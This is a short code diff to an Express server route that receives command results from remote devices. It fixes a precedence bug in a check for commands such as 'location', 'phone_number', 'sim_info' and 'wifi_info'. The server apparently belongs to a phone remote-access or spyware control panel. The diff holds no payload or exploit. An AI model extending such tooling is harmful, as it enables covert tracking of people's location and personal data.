@@ -2017,14 +2017,14 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
     
-    if (command && command.includes('_html') || 
+    if (command && (command.includes('_html') || 
         command === 'ip_info' || command === 'phone_number' || command === 'location' ||
         command === 'sim_info' || command === 'wifi_info' || command === 'all_info' ||
         command === 'mobile_info')) {
         console.log(`📎 ${command} using dedicated endpoint`);
         return res.sendStatus(200);
     }
-    
+
     console.log(`📨 Result from ${deviceId}:`, { command });
     
     const device = devices.get(deviceId);
